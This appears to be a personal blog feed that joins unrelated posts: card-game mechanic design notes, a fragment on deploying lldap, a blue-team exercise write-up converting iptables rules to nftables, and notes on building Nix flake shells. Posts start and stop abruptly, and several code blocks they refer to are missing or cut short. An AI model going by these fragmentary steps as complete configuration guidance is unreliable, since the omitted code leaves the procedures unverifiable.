<p><strong>Abitrary Active/Trigger</strong> : Produce actives/triggers to place on cards. Should this cost production to apply?</p>
<p><strong>Arbitrary Negative Active/Trigger</strong>: Produces negatives to put on cards. Negative health is straightforward, but negative damage, “agility”, and etc get interesting.</p>
<p><strong>Empheral</strong>: Cause a card to not be affected by stuff, but also not be able to affect stuff. Basically mtg phase.</p>

<p><strong>Familiar friends</strong>: X: When you play a card with similar trait and valuet and value appears, including this specific trigger + active, Do up to 1 + X of an active trait, based on the common traits and values that are shared.</p>
<p>Note: Too op if it includes health, attack, and friends… but is it?</p>
<p>Also: Familiar friends… but on death?</p>
<p><strong>Damage dealt via attacking or blocking</strong> (including or excluding overkill): X : X</p>

<p><strong>Instead of card draw</strong>: X: X * N</p>

<p><strong>Getting attacked by X cards</strong>: X: X</p>
<p><strong>When XYZ active token is applied</strong>: X : X</p>
<p>Most notable of this is: “when lifegain” as that has very good synergy</p>
<p>Problem (?): Can go infinite.</p>
<p><strong>When opponent takes damage</strong>: X : X</p>
<ul>
<li>This could lead to going infinite with “burn” tokens.</li>
</ul>
<p><strong>Formation: When pattern created during attack/defense phase</strong>: Form a pattern of your own cards (must be on on top): X : X * (cards with same trigger in the pattern) * (amount of different patterns linked together):</p>
<p>Eg: A pattern can be a straight line, or a curved line, or a grouping of three, a lightning bolt or whatever. Orientation does not matter (?), only relative orientation does.</p>
<p>Probably a better way to do this.</p>
<p>Maybe: Outputs X * (total in chain) * (complexity of chain/amount of extra connections for every node with more than one connection) * (cards with same trigger in chain) * (Amount of overlapping cards that are also part of a different formation)</p>
<p>Maybe too powerful?</p>
<p>Goal: Replace tribal, allow for synergy without being contrived/artificial. The synergy is artificial, but players have to work for it.</p>

<section id="curses" class="level2">
<h2 class="anchored" data-anchor-id="curses">Curses:</h2>
<p><strong>Constant Mana Cost</strong>: Take X mana from the player every turn, or if they can’t provide that, life. In exchange, offer X * N card creation points for players to use. Essentially for each negative mana point, they can add one of each trait for each negative mana point during the turn. Must be paid before the attacking step.</p>
<ul>
<li>Should it die if no mana given?</li>
<li>Or should it take from life?</li>
<li>What about production? Probably not effect actives… but I like the idea of cumulative upkeep for a spell tower.</li>
</ul>
<p>I think I need to separate this into two different curses: One which does damage, and one that doesn’t.</p>
<p><strong>Day/Night</strong>: X from anything: X Opponent gains control of this card during their turn, except the card doesn’t have full stats. It only has X stats, X for each trait in place. It also gains X stats in the opposite section of held traits. So 4 hp, but 0 attack, but 2 X becomes 2 hp, 2 attack.</p>
<p>How to handle one time spell cards? * Day/night results in the card staying alive, even when it has 0 or less health * Opponent gets a portion of spell effects * Daynight straight up doesn’t affect actives ← I like this one</p>
<p>May need different name, mtg already has daynight. Traitor? Betrayal? Doublecross? Doubleagent?</p>
<p><strong>Bounce</strong>:</p>
<p>Card on field goes to hand, in exchange for a card that has a base cost less than Cost – X base cost. If there is no such card, then this card goes to the graveyard. You can keep the card on the field in exchange for a sacrifice of at least Cost + X * N from your hand or the field, straight to the graveyard.</p>
<ul>
<li>Beginning or end of turn (it would be nice to bounce immediately)</li>
<li>How to have card be persistent?</li>
</ul>
<p>At beginning of turn, or when card is attempted to be played, take it off the field for a card in hand with base value &lt; cost – X, or sacrifice card from field with cost + X?</p>
<p>AKA: some kind of bounce curse</p>
<p>At beginning of turn or before played, take cards on the field that are worth more/less than something off the field and put them back into your hand. If you cannot do this, because of a full hand or because of the value</p>
<p>On/before turn, bounce cards value back to hand. If you can’t do that, then bounce this card, exchanging it for something in your hand with less than X. If can’t do that, then graveyard.</p>
<p>On turn, and/or when this card is played, return this cards value +</p>
<p><strong>Siege/Battle</strong>: X from anything: X card is cast as an X health card under an opponents control. They must defend it, if the attacking player manages to kill it, then it becomes the normal card</p>
<ul>
<li>Allow spell damage to kill the battle?</li>
</ul>
<p>Goal: replace siege/battle from mtg</p>
<p><strong>Equality</strong>: X from triggers/actives: X times N this card gives opponent up to X*N of of “actives” it generates, when it generates them.</p>
<p>Goal: Allow for the creation of board wipe type effects.</p>
<p><strong>Sacrifice</strong> X from anything : X You need to sacrifice cards with a base cost of X * N cards on the field when played.</p>

<p>Goals: Replace mtg creature tokens, mtg evasion mechanics (keywords flying, horsemanship, unblockable, trample, etc)</p>
<p>https://mtg.fandom.com/wiki/Evasion_ability</p>
<p>Maybe I need another resource?</p>
<p>Catch up mechanics?</p>
<ul>
<li>I like the “equality” curse</li>
<li>But I want one more</li>
</ul>
<p>Some kind of meta card attribute?</p>
<p>Potential keywords:</p>
<p>Recursion: X : X Pay Base Cost – X to cast this card from your graveyard</p>
<p>Buyback: X : X Pay Cost – X in addition to casting this spell to return it to your hand when you cast it.</p>
<ul>
<li>Too weak</li>
</ul>
<p>Banding/Splitting: Combine and divide mechanics somehow (or maybe I should build these into the game rules)</p>
<p>Anti-Actives</p>
<p>Take life: X :X</p>
<p>Idea is to have taxes or some sort of sin mechanic.</p>
<p>Gain +X +X when X: Idea is some conditional gain strength mechanic</p>
<p>In general, I want some kind of state based trigger, that can activate every turn.</p>
<p>When X cards on the field. When X cards in graveyard. X in hand? etc. How to make fair?</p>
<p>Okay, after watching <a href="https://www.youtube.com/watch?v=HuAkw707oOA">A video about lifedecking</a>, I’ve realized that it’s problematic to incentivize cards in the graveyard, because players want to <em>play</em> their cards, and a strategy which incentives sacrifice or something along those lines isn’t really that. But, this problem with lifedecking also applies to <em>any</em> incentive to maintain a “state” of the game. Although an ongoing incentive to maintain a certain boardstate is good to get to, it also incentivizes players to <em>keep</em> that board state — which may not be fun. So this will be put on hold for a while, and instead, I will only incentive <em>actions</em> by the players. Interesting =/= fun to play.</p>
<p>Alternate cost where players can pay other token types. Maybe decreases N or lets them pay base cost. This can be a curse type.</p>
<p>Tax and Stax: Fundamentally, a tax an opponent can’t pay to do something is like a stax: Some kind of opponent restrictions… actually, I don’t like this. I want a control archetype, but I confused control with stax/tax. Clash Royale manages to have control be a major archetype without s/tax.</p>
<ul>
<li>Opponent can’t X doesn’t work because of the way my game is designed. However, opponent can’t do X fundamentally equivalent to a tax effect that the opponent can’t afford to play?</li>
</ul>
<p>Formation application token: Allow for multiplication of tokens on the battlefield. Costs X1 * X2 * X3 * N where X1 is the multiplication and X2 is the formation size, and X3 is the total tokens it can take. So a 2 * 1 * 3 would double up to three tokens for a single card.</p>
<p>Some kind of sacrifice cards curse.</p>
<p>See also: MTG emerge</p>
<p>MTG Surge</p>
<p>MTG rebound</p>
<p>MTG storm: Pay X to duplicate the on-cast effects of this card?</p>

<section id="combat" class="level1">
<h1>Combat</h1>
<p>Defensive player sets up layout at the end of their attacking turn, and cannot change it or reoganize it.</p>
<p>Attack player sets a layout, and then either chooses to make the first move, or to pick how the connections work.</p>
<p>Played on something equivalent to a hex grid, but not an actual hex grid. A square grid where each row is offset by ½, and touching squares are considered connected.</p>
<p>Moves cards can make:</p>
<p>Move: Move onto an adjacent card.</p>
<p>Swap: Replace adjacent card with this one</p>
<p>Pull: Pull connected card under this card.</p>
<ul>
<li>Pull into spot, and move this card out of the way?</li>
</ul>
<p>Push: Move card out of way? Maybe can push in place to move a card to an adjacent spot</p>
<p>Spawn: Spawn new piece in a blank spot adjacent to your own pieces, and only your own pieces</p>
<p>All of these moves can be done over a chain of your color’s cards, including attacking/defending ones.</p>
<p>Stacked cards are considered as attacking eachother, and cannot move on/off, but they can be moved over.</p>
<p>The attacker round ends immediately when a player stalemates is unable to make a swap, push, or pull move. ???</p>
<p>One hive rule (from hive): Players cannot make a move that results in their being two groups of cards.</p>
<p><a href="https://en.wikipedia.org/wiki/Hive_(game)" class="uri">https://en.wikipedia.org/wiki/Hive_(game)</a></p>
<p>So… how does a player actually do damage? And how should collective defense/attack and multi attack/defense work?</p>
<p>Two ways I am thinking of doing damage: Getting a card onto/past all defenders</p>
<p>Or creating a chain that connects it past defenders. Maybe like 1 damage for each card in the chain?</p>
<p>How should cards launch an attack against valuable cards? Surrounding them? Building a chain which accesses them?</p>
<p>Ideas:</p>
<ul>
<li>Attackers cards deal (ATK + ATK + ATK) *N where N in the amount of cards surrounding a card, but those cards of that set can’t attack a player</li>
<li>Defenders cards can protect (DEF* )</li>
<li>Surrounding a card with 6 cards is an insta kill (can be on top cards as well)</li>
<li>This is in <em>addition</em> to the mechanic where cards on top of eachother battle.</li>
</ul>
<p>Idea: replace mtg banding</p>
<p>Should cards being on top or below matter? Maybe? Only on top cards count for purposes of a chain, and also can surround other cards.</p>
<p>Anyway, this is good, but I need to calculate the fairness of this game. I think the only way to calculate fairness is to write a program that solves this game.</p>
<p>Combat ends <strong>immediately</strong> where a player cannot make another move (either attacker or defender).</p>
<p>What about drawish rules, like 3 fold repetition?</p>
<section id="combat-phase" class="level2">
<h2 class="anchored" data-anchor-id="combat-phase">Combat Phase</h2>
<p>It goes step by step. Steps go like</p>
<ul>
<li><p>Offensive player moves cards, or plays cards into the combat zone. This one can only be done once.</p></li>
<li><p>Offensive player activates an “instead of draw trigger” Only done once, and mutually exclusive with the above.</p></li>
<li><p>Defensive player makes a move, or plays a card into the combat zone.</p></li>
<li><p>End step</p></li>
</ul>
<p>Or maybe vice versa?</p>
<p>Regardless, cards only die at the end of each “step”, giving either player time to do things like counterspell and react with spell type abilities.</p>
<p>Infinite Loop Prevention: A trigger can only be triggered once per combat step (for both players).</p>
</section>
<section id="programming-this" class="level2">
<h2 class="anchored" data-anchor-id="programming-this">Programming This</h2>
<p>I think I need to convert this to a python program that will solve any set of rules I give it, in order to actually ensure my game is fair., I’ve done some testing on my own, but I don’t think just one person can play chess.</p>
<ul>
<li><a href="https://stackoverflow.com/questions/11373122/best-way-to-store-a-triangular-hexagonal-grid-in-python">Hexagonal Grid in python (stackoverflow)</a></li>
<li><a href="http://www-cs-students.stanford.edu/~amitp/game-programming/grids/">Grids</a></li>
<li><a href="https://www.redblobgames.com/grids/hexagons/">Grids/hexagons</a></li>
<li><a href="https://www.redblobgames.com/grids/parts/">Grids/parts</a></li>
</ul>
<p>So… how can I make a hexagonal grid in order to calculate solutions to my game?</p>
<p>I really, really like the idea of representing <a href="https://www.redblobgames.com/grids/hexagons/#coordinates-cube">hexagonal coordinates as a cube</a>.</p>
<p>Pseudocode of what I want:</p>
<pre><code>HexGrid = 2d array, or graph of nodes

CheckLegality: Function that checks if a hex grid config is legal (all nodes are connected)

GetMovesJump: Get Possible moves of the Jump on top of another card type

GetMovesShove: Get possible moves of the shove card out of the way type

GetMovesPull: Get possible moves of the pull card under type

GetMovesSwap: Get possible moves of the swap type

GetWin: Get the amount of damage a winning attacker would do</code></pre>
<p>I would also need several other functions/features, like I would have to be able to detect if a set of moves is the same as an older set of moves. I think this is easier with a set of nodes than an infinitely large hex grid.</p>
<p>People at the San Fernando Valley LUG, said I should research “graph theory”, because there already exist algorithms to check if all nodes are connected, or to traverse a graph, or so on.</p>

<p>Looking at this, nss-pam-ldapd seems to be the most generally available option for systems. Although, pam is only portable to systems that have it, all of our systems have pam, except for one — the openbsd system.</p>

<h1>Deploying lldap</h1>
<p>Windows team didn’t give us access to their active directory server, so we decided to deploy ldap instead. For deploying lldap, I chose <a href="https://github.com/lldap/lldap">lldap</a>, an all in one ldap implementation, that comes with a web ui for managemnt.</p>

<p>And then I copied the <code>lldap_config.docker_template.toml</code> to <code>./dat a/lldap_config.toml</code>. This sets up the default config for lldap.</p>
<p>From here, the LDAP configuration can be edited through the web ui accessible at http://<you-ip>:17170</you-ip></p>

<p>This is for the <a href="https://nice-challenge.com/">NICE</a> challenge. It’s a blue team challenge where you are tasked with hardening machines. Perhaps there is more, but all I was asked to do for this challenge was some simple hardening.</p>
<p>The name of this specific challenge was “CCDC Training 1 - Firewall Updates at Pretty Safe Electronics Corp.”. The point of this challenge was to convert multiple older Linux machines from iptables to nftables.</p>
<p>Like previous Nice challenges, this challenge also began with a simulated chatroom, where we the situation was explained.</p>
<p><img src="./writeups/nice-challenge-6/images/chatroom.png" class="img-fluid"></p>
<p>Here are the empty checks:</p>

<p>In the home directory, there is a file that contains the iptables rules:</p>

<p>Except… not quite. When using iptables -L or iptables-save to look at the rules, they give different results than the saved file, a few less:</p>

<p>Because the file in the home directory has extra iptables configuration, I will use those configurations instead. Despite being the output of <code>iptable-save</code>, I can use the <code>iptables-nftables-compat</code> package, which provides and <code>iptables</code> and <code>iptables-save</code> command that actually manipulate <code>nftables</code>.</p>
<p>So, because only the <code>INPUT</code> chain has rules, and none of the other chains have any rules (including <code>mangle</code> or <code>nat</code>), we only need to flush those rules:</p>
<p><code>iptables -F INPUT</code></p>
<p>The other thing that needs to be done is to change the iptables <code>INPUT</code> table to from teh default <code>DROP</code> policy to an <code>ACCEPT</code> policy.</p>
<p><code>iptables -P INPUT ACCEPT</code></p>
<p>after this, iptables is clear of rules:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">Chain INPUT (policy ACCEPT)</span>
<span id="cb4-2">target     prot opt source               destination         </span>
<span id="cb4-3"></span>
<span id="cb4-4">Chain FORWARD (policy ACCEPT)</span>
<span id="cb4-5">target     prot opt source               destination         </span>
<span id="cb4-6"></span>
<span id="cb4-7">Chain OUTPUT (policy ACCEPT)</span>
<span id="cb4-8">target     prot opt source               destination</span></code></pre></div>
<p>Now, with the iptables chains set to the default, and the ruleset saved, we can comfortable switch to nftables. The <code>iptables-compat</code> set of commands, provided by the <code>iptables-nftables-compat</code> package, lets us restore the ruleset to nft from the firewall:</p>
<p><code>iptables-compat-restore fs_tables_v4</code> ­— this passes the “Fileshare filtering traffic correctly check.</p>
<p><code>systemctl enable nftables</code></p>
<p><code>systemctl start nftables.service</code></p>
<p>And… no checks passed? It seems that enabling the nftables service resets the nftables rules.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/lib/systemd/system/nftables.service</strong></pre>
</div>
<div class="sourceCode" id="cb5" data-filename="/lib/systemd/system/nftables.service" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">[Unit]</span>

</div>
<p>The systemd nftables service seems to be a oneshot service that does nothing but flush the nftables rules. After disabling this service and using <code>iptables-compat-restore</code>, again, the “Fileshare filtering” check passes again.</p>
<p>After <code>apt remove iptables</code>, this removes <code>iptables</code>… and <code>iptables-nftables-compat</code>. But the “Fileshare remove iptables” check passes.</p>

<p>What needs to be logged:</p>

<p>This works, and logs are reported in syslog, and forwarded to the domain controller machine. It just does not pass the check.</p>

  <title>Creating a nix flake shell, the “proper” way</title>
  <link>./playground/flake-shell/</link>
  <description><![CDATA[ 





<p>So, I think it’s time for me to move from the older channels way of doing things in nix, to the newer flakes. I am using the <a href="https://github.com/DeterminateSystems/nix-installer">determinate system nix installer</a>, which only comes with flakes. However, the nix docs are very poor, so I am going to document my process of converting my development environment here.</p>
<p>The first thing, is that despite the fact that there is a lot of the existing flakes use a utility called <a href="https://github.com/numtide/flake-utils">flake-utils</a>. However, this tool was ultimately started as an experiment, and has issues. A <a href="https://ayats.org/blog/no-flake-utils/">blog post</a> (<a href="https://web.archive.org/web/20240229094244/https://ayats.org/blog/no-flake-utils/">archive</a>) goes over some of the issues it has, and recommends against it… except I can’t figure out at all how to apply it.</p>
<p>The other recommendation is another pattern, recommended by Reddit user Tomberek:</p>

<p>There are multiple different ways of creating an output for multiple systems at once, it seems.</p>
<p>So far:</p>
<ul>
<li>ForEachSystem</li>
<li>Flake-parts</li>
<li>Flake-utils</li>
<li>Tomberek’s method</li>
</ul>
<p>I suspect there are other methods, potentially better one’s, that aren’t documented. However, because of the <a href="https://ayats.org/blog/no-flake-utils/">no-flake-utils</a> blogpost, where the author suggests to use pure nix and no libraries, I have decided to opt for that approach.</p>
<p>My ultimate goal is to convert the shell.nix I am using, into a flake.</p>

<p>After some tinkering, I get this to at least load, and not give me a syntax error. Instead, it gives me a different error:</p>
<p><code>error: flake 'git+file:///home/moonpie/vscode/test/flake-test' does not provide attribute 'packages.x86_64-linux.default' or 'defaultPackage.x86_64-linux'</code></p>
<p>I find this odd, since I provide a devshell. However, I realized that the other command to get a reproducible shell environment, <code>nix develop</code>, might be what is used instead to call upon the <code>devShells</code> attribute.</p>

<p>What’s the difference between nix shell and nix develop? From my understanding, <code>nix develop</code> is designed for developing packages, as it brings in build dependencies, rather than only runtime dependencies. It’s because of this, that I want <code>nix shell</code> to work instead, because that command seems to be focused more on simply getting the tools I want.</p>
<p>Except, according to some comparisons I found online, <a href="https://discourse.nixos.org/t/difference-between-nix-shell-nix-shell-nix-develop/32469/4">nix shell can’t even adjust environment variables</a>. Now of course, a single forum reply is <em>not</em> documentation… but nix’s documentation is very poor, and this is a common frustration, being forced to rely on forum posts rather than official documentation for information.</p>
<p>The <a href="https://nix.dev/manual/nix/2.18/command-ref/new-cli/nix3-shell">official docs</a> talk about using <code>nix shell</code> as a command line program, but not at all how it interacts with flakes and .nix files.</p>
<p>I got something that works for <code>nix develop</code></p>

<p><code>nix develop</code> works fine, except it takes a long time to setup on the first run, compared to <code>nix-shell -p quarto nodePackages_latest.npm</code>. I wonder if this is because, since <code>nix develop</code> is designed for development purposes, it pulls in more dependencies than <code>nix-shell</code> does.</p>
<p><code>nix shell</code> doesn’t work at all. It gives me a different shell, and adds things to the path, but it doesn’t actually add any of the programs I specify to the path.</p>
<p>(Also, I still have another unanswered question: What does the <code>@</code> symbol mean in a nix expression).</p>
<p>I later went and <a href="https://nix.dev/tutorials/nix-language.html#named-attribute-set-argument">found an answer</a>. <code>@</code> <em>names</em> the attribute set</p>
<p>I managed to get <code>nix shell</code> working… somewhat.</p>

<p>And this makes the <code>jupyter</code> command available to me in my shell, and the library I called upon. But, this doesn’t seem scalable. How do I get this to do more packages? How do I get this to do environment variables? And is this really better than <code>nix develop</code>?</p>
<p>I started to do some testing. The big problem, I’ve found with nix develop, is that since it is designed for development, it brings in development dependencies, regardless of the fact that I am <em>not</em> doing development, and am instead just aiming for a reproducible shell environment.</p>

<p>And nothing. (no reply to that command means the environment variable is unset). <code>nix shell</code> does not seem to set environment variables at all, even if I set them in the <code>pkgs.mkShell</code>, compared to <code>nix develop</code>, which does that.</p>
<p>However, I don’t want to bring <em>every</em> single build dependency as just for my shell environments.</p>
<p>I did more testing with the various <a href="http://ryantm.github.io/nixpkgs/stdenv/stdenv/#ssec-stdenv-dependencies-reference">types of dependencies</a> that a <code>pkgs.mkShell</code> (or more accurately, what it abstracts, <code>stdenv.mkDerivation</code>), and every single type of them brings build dependencies. This is a feature of nix develop, but it is becoming a hindrance.</p>
<p>Nevermind. Apparently, <code>nix-shell</code> also brings in build dependencies, and behaves identically to <code>nix develop</code>, and completely unlike <code>nix shell</code>. Some part of me wonders if there is some way to get this working. Another part of me doesn’t care.</p>
<p>Since I have something working, I modified the <a href="https://nixos.wiki/wiki/flakes#Super_fast_nix-shell">super fast nix shell</a> example to not use flakes.</p>

<p>One last thing. What does the <code>@</code> symbol do? I suspect nothing. Kate (my IDE for nix testing), complains about the <code>input</code> binding being unused, so I am gussing it doesn’t do anything.</p>
<p>When I remove it, and replace that line with:</p>
<p><code>outputs = {nixpkgs, ...}: let</code></p>
<p>It works fine.</p>
<p>After all of this, I did realize something.</p>
<p>The configuration file for nix has an option called “extra-nix-path”</p>

<p>This option makes channel commands available and working, even though no nix channels are actually installed. Meaning, I could have continued to use <code>nix-shell</code>, and it would have worked…</p>
<p>Well, flakes still have their own benefits. The version of <code>nixpkgs</code> used is tracked in a <code>flake.lock</code> file in the git repo. This ensures reproducibility, as I would be able to update the version of <code>nixpkgs</code> for everyone using the repo, rather than having to rely on people updating their channels manually (running <code>nix-channel --update</code>). With the latter, channels will result in a different version of <code>nixpkgs</code> being used, but with flakes, everybody uses the same version of <code>nixpkgs</code>.</p>
<p>However, I still would like to know if there is a way to not bring along every development dependency.</p>
<p>Okay, I asked on the Nixos Discord about not bringing along every development dependency, and I was told that wasn’t how <code>nix develop</code> worked. Rather, they claimed, the default <code>pkgs.mkShell</code> brings upon a “standard environment” of some build tools like gcc. Alternatively, you can use <code>pkgs.mkShellNoCC</code>.</p>
<p>This actually, works, to an extent. Using <a href="https://github.com/utdemir/nix-tree">nix-tree</a>, I can analyze the disk space used by the various things downloaded by nix.</p>
<p>With the standard environment:</p>

<p>This is a decent difference (26 megabytes) — and indeed, it was as I thought, the latex bundle package uses up the most disk space out of everything.</p>
<p>I did some research, continuing to find an even more minimal shell. However, it doesn’t seem to be worth it. One <a href="https://discourse.nixos.org/t/with-default-nix-empty-nix-installs-packages-why/20284/3">solution</a> mentions to use <a href="https://github.com/numtide/devshell">devshell</a>, however, after browsing the source code, it doesn’t seem to be that much more minimal thank mkShellNoCC, and the documentation is sparse… it suggestst TOML, rather than nix for configuring the shell environment. And finally, the entire point of this endeavor was to <em>avoid</em> using external dependencies for my shell environments…</p>
<p>There is also <a href="https://fzakaria.com/2021/08/02/a-minimal-nix-shell.html">another blogpost</a> where they attempt to strip down the nix shell environment of dependencies, including GNU coreutils, but it eventually fails because the basic nix shell environment requires <code>mkdir</code>.</p>
<p>Now… which latex distribution should I switch to? I probably don’t need the every single latex package in nixpkgs, especially if all I want is to render a pdf.</p>
<p>Currently, I am using <code>texlive.combined.scheme-full</code>, which is exactly that. According to the <a href="https://quarto.org/docs/output-formats/pdf-engine.html#overview">quarto pdf docs</a>, quarto recommends, and also is able to install <code>tinytex</code>. WHen quarto manages a texlive or tinytex distribution, it is also able to automatically install missing packages.</p>

<p>After a lot of tinkering with latex packages, I manage to get it down to just under 2 GB of disk space used. Can I make it smaller? What about bzip, tar, or other coreutils that are taking up space?</p>
<p>I decided to tinker with python and jupyter notebooks next. I was previously using the <code>juptyer</code> package, which is a metapackage containing all the jupyter components. I managed to cut it down quite a bit, to just <code>jupyter-core</code> and <code>pyaml</code>. This reduced the size further:</p>

<p>However, can I reduce it further? I remove the size of quarto’s installation, by deleting the vendored versions of deno, typst, dart-sass, and esbuild, and using the nix versions instead. But what if that’s what’s using up more space?</p>

<p>Removing nix dependencies gets it down to 1.04 GB… but I don’t really like this setup. Vendoring is kinda problematic for a variety of reasons. I’m already vendoring pandoc, for example, and if pandoc is used again outside of the nix store, then it would take up twice as much disk space.</p>
<p>Another thing is versioning. Although the pandoc version quarto provides is newer than the one in nixpkgs, the version of typst is the same, and the versions of dart-sass and deno is <em>older</em> by 4 minor versions.</p>
<p>But, when comparing nix-tree and looking at the ark, most of the packages outside quarto are bigger… or are they?</p>

<p>Changing to the typst in nixpkgs decreases the size just a little bit. Not a lot, but just a little bit. It’s a pity that changing deno and dart-sass for the nixpkgs versions increases the size by quite a bit, as the nixpkgs versions are newer. Changing pandoc also increases size, but the pandoc version provided by quarto is newer.</p>

<h1>More issues, no tab autocomplete</h1>
<p>Nope, it’s not the final shell. For whatever reason, if I open Vscode, or zellij using the <code>nix develop</code> shell, I cannot use tab autocomplete. In addition to that, the Vscode shell seems to be broken in others ways.</p>
<p>Here is the shell prompt:</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb24-1">\[\][moonpie@lizard moonpiedumplings.github.io]$ \[\]</span></code></pre></div>
<p>Yeah. Not what it’s supposed to be. I don’t know what the backslashes signify. However, <code>nix-shell</code> continues to work fine for zellij.</p>
<p>There are some relevant issues for this:</p>
<ul>
<li>https://github.com/NixOS/nix/issues/6091</li>
<li>https://github.com/NixOS/nix/issues/6982</li>
<li>https://github.com/NixOS/nix/issues/8764</li>
</ul>
<p>In a related <a href="https://discourse.nixos.org/t/general-nix-office-hours/15019/37">discourse post</a>, Nobbz suggests to use <code>eval</code>, but that also does not work, not do related solutions with <code>. &lt;()</code>.</p>
<p>The big problem is that <code>nix develop</code> is designed for emulation of the nix build environment, which is non-interactive. <code>nix shell</code>, as I noted above, does not properly replace <code>nix-shell</code>, as it does not allow for any configuration of environment variables. Or can it?</p>
<p>I also investigated <code>pkgs.buildEnv</code>, which is <a href="https://github.com/NixOS/nixpkgs/issues/251039">literally undocumented</a>, in classic Nix fashion. I read the <a href="https://github.com/NixOS/nixpkgs/blob/master/pkgs%2Fbuild-support%2Fbuildenv%2Fdefault.nix">source code</a>, but it doesn’t seem to be able to set environment variables outside of wrapping programs. It mainly seems to be ableto add programs to the path.</p>
<p>Another solution is <a href="https://github.com/edolstra/flake-compat">flake-compat</a>. It’s a bit of nix code by Eelco Dostra that has creates a <code>shell.nix</code> that enables <code>nix-shell</code> to be used with flakes. I find it deeply ironic that despite all this effort to use flakey commands, I still end up finding that the non-flake commands work perfectly.</p>
<p>Another suggestion was to use direnv, but I don’t want to use that.</p>
<p>Anyway, I noticed something different about the <code>nix-shell</code> vs <code>nix develop</code>:</p>

<p><code>nix-shell</code> defaults to an bash-interactive, whereas <code>nix develop</code> seems to use a stripped down, noninteractive version of bash. This is probably because <code>nix develop</code></p>
<p>The first thing I tried was to have <code>SHELL = "${pkgs.bashInteractive}/bin/bash";</code> in <code>pkgs.mkShell</code>, but this didn’t work. <code>nix develop</code> seems to set it’s own environment variables, <em>after</em> the other variables are set.</p>
<p>The first thing I did was to set a post shellHook, which <code>nix develop</code> would run, and would <code>export</code> the variable.</p>

<p>This worked for zellij, but vscode’s terminal was still broken. To get vscode’s terminal working, I had to add <code>bashInterative</code> to packages:</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb28-1">pkgs.mkShellNoCC {</span>
<span id="cb28-2">  packages = with pkgs; [ bashInteractive ];</span>
<span id="cb28-3">   shellHook = ''</span>
<span id="cb28-4">    export SHELL='${pkgs.bashInteractive}/bin/bash'</span>
<span id="cb28-5">  '';</span>
<span id="cb28-6">}</span></code></pre></div>
<p>I actually encountered a similar issue with python. Vscode seems to ignore things not added to path, even if they are specified in other ways, like <code>$PYTHONPATH</code> pointing to the correct version of python.</p>
<p>But now, this finally works.</p>
</section>
<section id="home-manager" class="level1">
<h1>Home-Manager</h1>
<p>Next thing is to convert home manager to flakes. I need a slightly older version of kubectl, and flakes allow me to use packages from multiple versions of nixpkgs.</p>
<p>I followed the <a href="https://nix-community.github.io/home-manager/index.xhtml#sec-flakes-standalone">standalone flakes installation instructions</a></p>
<p><code>nix run home-manager/master -- init --switch</code></p>
<p>And with this, I get a basic flake.nix, flake.lock, and home.nix in <code>.config/home-manager/</code>.</p>
<p>For older versions of packages, there are two sites I like, nixhub and lazamar’s site:</p>
<ul>
<li>https://www.nixhub.io/</li>
<li>https://lazamar.co.uk/nix-versions/</li>
</ul>
<p>I found the correct nixpkgs revision for what I want: <code>7a339d87931bba829f68e94621536cad9132971a</code>.</p>
<p>However, using packages from multiple versions of nipkgs isn’t as easy as I thought it would be. The <a href="https://wiki.nixos.org/wiki/Flakes#Importing_packages_from_multiple_nixpkgs_branches">officail docs</a> suggest to use an overlay, which feels unecessary. Why can’t I just replicate what it does for <code>nixpkgs</code>, but for <code>nixpkgs</code> again?</p>
<p>I tried that, and it didn’t work. The error’s aren’t very clear, but I think it’s because the home manager configuration is a function with explicit arguments, and it errors when I try to feed it more than what it wants.</p>
<p>Thankfully, I found another simple solution:</p>

</div>
<p>And then in the beginning of home.nix:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>home.nix</strong></pre>
</div>
<div class="sourceCode" id="cb30" data-filename="home.nix" style="background: #f1f3f5;"><pre class="sourceCode nix code-with-copy"><code class="sourceCode nix"><span id="cb30-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">config</span><span class="op" style="color: #5E5E5E;

background-color: null;
font-style: inherit;">}</span>:</span></code></pre></div>
</div>
<p>And this works. I can use <code>pkgs-kbctl.kubectl</code> to reference kubectl version 1.28.4, which is what’s on my server.</p>
